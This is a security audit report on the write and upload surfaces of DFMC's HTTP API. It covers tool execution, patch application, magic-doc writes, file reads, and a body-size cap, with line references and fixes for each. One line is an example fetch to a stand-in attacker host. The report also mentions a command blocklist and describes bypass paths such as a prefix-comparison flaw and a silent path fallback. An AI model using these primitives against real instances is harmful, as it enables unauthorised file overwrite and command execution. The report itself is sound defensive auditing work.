# File Upload Results — DFMC

Scope: HTTP/MCP/CLI surfaces that accept content/paths and land them on
disk. DFMC does not have a classical multipart upload endpoint — instead,
the upload risk surface is "any HTTP endpoint that lets a remote caller
write to the filesystem (or to bbolt) via a tool call or workspace
patch." Phase 1 already flagged `POST /api/v1/tools/{name}` and `POST
/api/v1/workspace/apply` as the load-bearing exposure.

## Counts per file

| File | Findings |
|---|---|
| `D:/Codebox/PROJECTS/DFMC/ui/web/server_tools_skills.go` | 1 |
| `D:/Codebox/PROJECTS/DFMC/ui/web/server_workspace.go` | 1 |
| `D:/Codebox/PROJECTS/DFMC/ui/web/server_context.go` | 2 |
| `D:/Codebox/PROJECTS/DFMC/ui/web/server_files.go` | 1 (info) |
| `D:/Codebox/PROJECTS/DFMC/ui/web/server_conversation.go` | 1 |
| `D:/Codebox/PROJECTS/DFMC/ui/web/server_task.go` | 1 (info) |
| `D:/Codebox/PROJECTS/DFMC/ui/web/server.go` | 1 (info) |

There are **zero** `multipart.Reader` / `r.FormFile` /
`ParseMultipartForm` consumers anywhere in the codebase
(`grep -r 'multipart\|FormFile' D:/Codebox/PROJECTS/DFMC` returns no
matches). All "uploads" go through JSON request bodies.

---

## UPLOAD-001 — `POST /api/v1/tools/{name}` is a universal write/exec primitive (High)

- **Severity**: High (when web `auth=none` on a publicly reachable
  bind, which the bind-host normalization actively prevents — so
  effective severity drops to Medium for the default config).
- **Confidence**: High
- **File:line**: `D:/Codebox/PROJECTS/DFMC/ui/web/server_tools_skills.go:151-173`
  (`handleToolExec`); route mounted at
  `D:/Codebox/PROJECTS/DFMC/ui/web/server.go:204`.
- **CWE**: CWE-434 (Unrestricted Upload of File with Dangerous Type),
  CWE-78 (OS Command Injection — for `run_command`),
  CWE-22 (Path Traversal — mitigated by `EnsureWithinRoot` per-tool).

The handler accepts an arbitrary tool name and JSON params, then calls
`s.engine.CallTool(r.Context(), name, req.Params)`. There is no allowlist
of tools at the HTTP layer — the user can hit:

- `name=write_file` with `{"path":"docs/x.md","content":"..."}` →
  writes to project root (subject to `EnsureWithinRoot` and the
  read-before-mutation gate).
- `name=apply_patch` with `{"diff":"..."}` → applies a unified diff to
  any project file (read-gate strict mode applies).
- `name=run_command` with `{"command":"go","args":["build","./..."]}` →
  shell exec, subject to `command.go`'s blocklist (`rm`, `sudo`, etc.)
  but otherwise unconstrained.
- `name=git_commit` → mutates git history.
- `name=web_fetch` with `{"url":"https://attacker.example/payload"}` →
  outbound HTTP (SSRF-guarded) and the response lands in the LLM
  context for the next turn.

Mitigations in place:

- `engine.CallTool` routes through `executeToolWithLifecycle` (CLAUDE.md
  contract), which fires the approval gate for non-`source="user"`
  callers. The web caller's source defaults to "user" (verified at
  `D:/Codebox/PROJECTS/DFMC/internal/engine/engine_tools.go:225` — the
  `if source != "user"` short-circuit on the approver), so **the
  approval gate does NOT fire for web-initiated tool calls**. This is
  documented in `architecture.md` §7 ("the explicit `if source !=
  "user"` check at `engine_tools.go:225`").
- Bearer-token middleware gates the call when `auth=token`.
- `bind-host normalization` rewrites non-loopback bind to `127.0.0.1`
  when `auth=none` (`server.go:152-160`), AND `cli_remote_start.go:45`
  refuses to start without `--insecure`.
- 4 MiB body cap (`server.go:314`).

**Net effect**: a network attacker who reaches a token-authenticated
DFMC web instance OR a `--insecure` `auth=none` instance can write
arbitrary content to any path under `ProjectRoot`, run any
non-blocklisted shell command, and trigger outbound web fetches. This
is by-design ("the web API is the workbench" per CLAUDE.md) but worth
documenting as the load-bearing upload surface.

**Recommendation**: bypass for `source="user"` is correct for CLI/TUI;
HTTP callers should NOT default to that source. Wiring web callers to
`source="web"` (or similar) would surface them through the approval gate.
This is a known design trade-off; surface it in the threat model.

## UPLOAD-002 — `POST /api/v1/workspace/apply` accepts arbitrary unified diffs (High)

- **Severity**: High (under same auth-config caveats as UPLOAD-001)
- **Confidence**: High
- **File:line**: `D:/Codebox/PROJECTS/DFMC/ui/web/server_workspace.go:54-96`
  (`handleWorkspaceApply`), with the actual `git apply` exec at
  `D:/Codebox/PROJECTS/DFMC/ui/web/server_workspace.go:184-259`.
- **CWE**: CWE-22 (Path Traversal — mitigated), CWE-78
  (Argument injection in git — partially mitigated)

Caller posts `{"patch": "..."}` and the body is fed to
`git apply --whitespace=nowarn --recount` via `cmd.Stdin`. Defences in
place:

- `security.SanitizeGitRoot(projectRoot)` validates the working tree
  root (line 99/185).
- `cmd.Dir = root` (line 109) — `git -C` not used so a path starting
  with `-` cannot become a flag.
- M3 patch sanitiser (line 193-210) strips lines starting with `--`
  (other than `---`/`+++`), `apply.`, `git config`, `[`. This is
  intended to defeat embedded gitconfig directives.
- After a successful `--check`, lines 232-256 re-run with `--dry-run
  --porcelain` and verify each affected path resolves inside `root`
  (via `EvalSymlinks` + `HasPrefix`).
- 60s timeout.

Residual risks:

- The post-check path verification at line 232-256 uses
  `strings.HasPrefix(absPath, root)` — this is **path-prefix
  comparison without separator normalization**, so a project root
  `/home/user/proj` would also accept `/home/user/proj-evil/file`. On
  Windows the `EvalSymlinks` may also return mixed-case paths.
  Recommend appending `string(filepath.Separator)` to `root` in the
  comparison (line 251).
- The patch sanitiser drops `--`-prefix lines that aren't `---`/`+++`,
  but a unified diff legitimately contains `\ No newline at end of file`
  and `--- /dev/null` for new files. Verified that `--- /dev/null` slips
  through (length > 2, but starts with `---` so the inner if-clause
  excludes it). Good.
- New-file creates: `git apply` on a hunk with `+++ b/path/outside/root`
  is the residual concern. The post-check loop catches this on line
  243-253. **However**: when `checkOnly == true`, the post-check loop
  is SKIPPED (the entire block at 232-256 is gated on `!checkOnly`).
  This is correct because in check-only mode no file write happens, but
  worth noting that an attacker could use check-only as an oracle for
  whether a path resolution succeeds.

## UPLOAD-003 — `POST /api/v1/magicdoc/update` writes to the project tree (Medium)

- **Severity**: Medium
- **Confidence**: High
- **File:line**: `D:/Codebox/PROJECTS/DFMC/ui/web/server_context.go:300-324`
  (`handleMagicDocUpdate`), file write at
  `D:/Codebox/PROJECTS/DFMC/ui/web/server_context.go:386-408`
  (`updateMagicDoc`), path resolver at
  `D:/Codebox/PROJECTS/DFMC/ui/web/server_context.go:462-472`
  (`resolveMagicDocPath`).
- **CWE**: CWE-22 (Path Traversal — mitigated)

Body fields `{title, hotspots, deps, recent, path}`. The `path` field
becomes the magic doc target. `resolveMagicDocPath` calls
`resolvePathWithinRoot(projectRoot, pathFlag)` and **falls back to the
default location** if the requested path escapes the root (line 467-471).
That fallback is a deliberate UX choice (comment at line 462-461) but
means a caller can write to ANY path inside the root by posting
e.g. `path=cmd/dfmc/main.go` — which would overwrite source code with
the generated MAGIC_DOC content (with `0o644` perms, no read-before-mutate
gate because this is a direct `os.WriteFile`, not the `write_file` tool).

This is a real write primitive — the read-before-mutation gate that
protects `write_file`/`apply_patch` does NOT apply here because
`updateMagicDoc` calls `os.WriteFile` directly (line 398).

**Recommendation**: pin the magic doc target to a fixed subtree
(`.dfmc/magic/`), or run the same hash-equality / read-before-mutate
guard `tools.Engine` already implements.

## UPLOAD-004 — `POST /api/v1/analyze` with `MagicDoc=true` triggers UPLOAD-003 path (Medium — duplicate)

- **Severity**: Medium (same write primitive as UPLOAD-003)
- **Confidence**: High
- **File:line**: `D:/Codebox/PROJECTS/DFMC/ui/web/server_context.go:326-384`
  (`handleAnalyze`)

When the request body has `magicdoc: true` and a `magicdoc_path`,
`handleAnalyze` calls `s.updateMagicDoc(...)` (line 366) — same write
primitive as UPLOAD-003. Surfacing it separately because the JSON shape
differs (`MagicDocPath` rather than `path`). The path goes through the
same `resolveMagicDocPath` fallback, so the same caveats apply.

The `Path` field of `AnalyzeRequest` IS validated against
`resolvePathWithinRoot` (line 343) — that's a hard refusal, not a
fallback. So the analyze path itself is safe; only the embedded magicdoc
write is the loose end.

## UPLOAD-005 — `GET /api/v1/files/{path...}` is read-only (Informational)

- **Severity**: Info
- **Confidence**: High
- **File:line**: `D:/Codebox/PROJECTS/DFMC/ui/web/server_files.go:45-105`

Read-only file fetch under the project root. Path goes through
`resolvePathWithinRoot` (`server_files.go:143-183`), which is
symlink-aware and verified to refuse `..`-escapes and resolved-symlink
escapes. **Belt-and-braces** check at line 177-181 catches mid-path
symlinks pointing outside the root. No write path in this handler. Good.

## UPLOAD-006 — `POST /api/v1/conversation/load` only references existing JSONL by ID, no upload (Informational)

- **Severity**: Info
- **Confidence**: High
- **File:line**: `D:/Codebox/PROJECTS/DFMC/ui/web/server_conversation.go:99-125`

`handleConversationLoad` accepts `{"id": "..."}` and calls
`engine.ConversationLoad(req.ID)` — the conversation manager loads from
its bbolt-backed store, not from a user-supplied path. **There is no
"import this JSONL" endpoint** that would let an attacker side-load a
hostile conversation file. The only way to populate the conversation
store from outside is via the engine's Ask/Chat path, which is
authenticated.

The `id` flows into `conversation.Manager` — verified that the ID is
used as a bbolt key, not a filesystem path. No traversal surface.

## UPLOAD-007 — `POST /api/v1/tasks` (and PATCH) writes user-supplied content into bbolt (Informational)

- **Severity**: Info
- **Confidence**: High
- **File:line**: `D:/Codebox/PROJECTS/DFMC/ui/web/server_task.go:85-133`
  (create), 160-218 (update)

Untrusted JSON fields land in `supervisor.Task` and are persisted via
`store.SaveTask`. The store is bbolt (no filesystem write outside the
project's `.dfmc/` directory), and the `Task` shape doesn't include any
filesystem-path field that would later be opened. **Exception**:
`FileScope` is a list of glob patterns used by the Drive scheduler to
detect conflicts (see CLAUDE.md `internal/drive/scheduler.go`). It is
NOT used to open / read / write files directly, but a malicious
`FileScope: ["**"]` could starve the Drive scheduler. Out-of-scope for
this playbook.

## UPLOAD-008 — Body size cap prevents pathological payloads (Informational)

- **Severity**: Info (positive)
- **Confidence**: High
- **File:line**: `D:/Codebox/PROJECTS/DFMC/ui/web/server.go:308-326`

`limitRequestBodySize` wraps every POST/PUT/PATCH/DELETE in
`http.MaxBytesReader(w, r.Body, 4 MiB)`. So an upload-style body cannot
exceed 4 MiB, which bounds memory growth on any of the upload-shaped
endpoints above.

---

## Summary

DFMC has no multipart upload surface. The functional equivalents are:

1. **`POST /api/v1/tools/{name}`** — universal write/exec primitive,
   the load-bearing exposure.
2. **`POST /api/v1/workspace/apply`** — patch-application primitive
   with multi-layer defence; one minor `HasPrefix` separator-bug worth
   tightening.
3. **`POST /api/v1/magicdoc/update`** + **`POST /api/v1/analyze` with
   `magicdoc:true`** — direct `os.WriteFile` outside the
   tools.Engine guard chain. Path resolver falls back to default
   silently when path escapes — recommend tightening to fixed subtree.

Conversation/task/load endpoints do NOT accept arbitrary file content
from external callers — they reference existing IDs or persist
structured data into bbolt.

The trust model is "if you have the bearer token, you have file-system
write inside `ProjectRoot` and shell-exec subject to the blocklist."
That should be a documented expectation, not a surprise.
